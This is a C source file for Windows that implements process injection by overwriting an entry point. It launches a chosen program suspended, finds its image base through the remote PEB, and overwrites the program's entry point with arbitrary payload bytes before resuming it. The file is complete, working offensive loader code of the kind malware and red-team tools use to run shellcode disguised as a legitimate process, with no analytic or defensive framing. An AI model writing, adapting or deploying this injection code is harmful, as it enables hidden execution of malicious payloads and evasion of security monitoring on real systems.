#include <windows.h>
#include <stdio.h>
#include <stddef.h>
#include <winternl.h>

#include "execution_core.h"

static PVOID get_main_image_base(HANDLE hProcess)
{
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) {
        return NULL;
    }
    
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    );
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
        hNtDll, "NtQueryInformationProcess"
    );

    if (!NtQueryInformationProcess) {
        return NULL;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0) {
        return NULL;
    }

    PVOID remoteImageBasePtr = NULL;
    ULONG_PTR imageBase = 0;

#ifdef _WIN64
    // x64: Read pointer at PebBaseAddress + 0x10
    remoteImageBasePtr = (PVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x10);
    if (ReadProcessMemory(hProcess, remoteImageBasePtr, &imageBase, sizeof(ULONG_PTR), NULL)) {
        return (PVOID)imageBase;
    }
#else
    // x86: Read pointer at PebBaseAddress + 0x08
    remoteImageBasePtr = (PVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x08);
    if (ReadProcessMemory(hProcess, remoteImageBasePtr, &imageBase, sizeof(ULONG), NULL)) {
        return (PVOID)imageBase;
    }
#endif

    return NULL;
}

int execute_technique(
    const unsigned char *payload,
    size_t payload_len,
    const char *target
)
{
    if (payload == NULL || payload_len == 0) {
        fprintf(stderr, "[-] Invalid payload\n");
        return -1;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create suspended target process
    if (!CreateProcessA(
        target, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi
    )) {
        fprintf(stderr, "[-] CreateProcess failed: %d\n", GetLastError());
        return -2;
    }

    // 2. Obtain the target process main ImageBase from remote PEB
    PVOID pTargetImageBase = get_main_image_base(pi.hProcess);
    if (!pTargetImageBase) {
        fprintf(stderr, "[-] Failed to obtain ImageBase from remote PEB\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -3;
    }

    // 3. Read the TARGET's remote DOS header
    IMAGE_DOS_HEADER dosHeader;
    if (!ReadProcessMemory(pi.hProcess, pTargetImageBase, &dosHeader, sizeof(dosHeader), NULL)) {
        fprintf(stderr, "[-] Failed to read remote DOS header: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -4;
    }

    // Validate DOS header
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[-] Invalid DOS signature at target ImageBase\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -5;
    }

    // 4. Read the TARGET's remote NT headers
    DWORD ntHeadersOffset = dosHeader.e_lfanew;
    IMAGE_NT_HEADERS ntHeaders;
    if (!ReadProcessMemory(
        pi.hProcess,
        (PVOID)((DWORD_PTR)pTargetImageBase + ntHeadersOffset),
        &ntHeaders,
        sizeof(ntHeaders),
        NULL
    )) {
        fprintf(stderr, "[-] Failed to read remote NT headers: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -6;
    }

    // Validate NT signature
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[-] Invalid NT signature at target ImageBase\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -7;
    }

    // Validate target architecture against the build.
#ifdef _WIN64
    if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        fprintf(stderr, "[-] Architecture mismatch: build=x64 target=non-x64\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -8;
    }
#else
    if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        fprintf(stderr, "[-] Architecture mismatch: build=x86 target=non-x86\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -8;
    }
#endif

    // 5. Obtain AddressOfEntryPoint RVA
    DWORD entryPointRVA = ntHeaders.OptionalHeader.AddressOfEntryPoint;
    SIZE_T imageSize = (SIZE_T)ntHeaders.OptionalHeader.SizeOfImage;

    if (
        entryPointRVA >= imageSize
        || payload_len > (imageSize - entryPointRVA)
    ) {
        fprintf(
            stderr,
            "[-] Payload does not fit within target image bounds\n"
        );
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -9;
    }

    // 6. Calculate RemoteEntryPoint = ImageBase + AddressOfEntryPoint
    PVOID pRemoteEntryPoint = (PVOID)((DWORD_PTR)pTargetImageBase + entryPointRVA);

    // 7. Overwrite the existing target EntryPoint with the opaque payload bytes
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        pi.hProcess,
        pRemoteEntryPoint,
        payload,
        payload_len,
        &bytesWritten
    )) {
        fprintf(
            stderr,
            "[-] Failed to write payload to EntryPoint: %lu\n",
            (unsigned long)GetLastError()
        );
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -10;
    }

    if (bytesWritten != payload_len) {
        fprintf(stderr, "[-] Payload write truncated: %zu / %zu bytes\n", bytesWritten, payload_len);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -11;
    }

    if (!FlushInstructionCache(
        pi.hProcess,
        pRemoteEntryPoint,
        payload_len
    )) {
        fprintf(
            stderr,
            "[-] FlushInstructionCache failed: %lu\n",
            GetLastError()
        );
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -12;
    }

    // 8. Resume the ORIGINAL suspended primary thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -13;
    }

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
